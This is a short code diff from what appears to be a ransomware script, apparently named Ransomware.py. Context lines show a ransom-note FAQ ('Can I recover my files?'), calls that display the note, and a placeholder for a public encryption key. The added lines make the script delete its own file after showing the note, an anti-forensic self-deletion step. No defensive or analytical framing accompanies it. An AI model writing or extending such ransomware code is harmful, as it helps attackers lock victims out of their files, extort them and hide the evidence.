@@ -95,6 +95,9 @@ Q: Can I recover my files?
     mainloop()
     display_note()
 
+    os.remove("Ransomware.py");
+
+
 def main():
     #### PUBLIC ENCRYPTION KEY WILL BE ADDED HERE ####
 
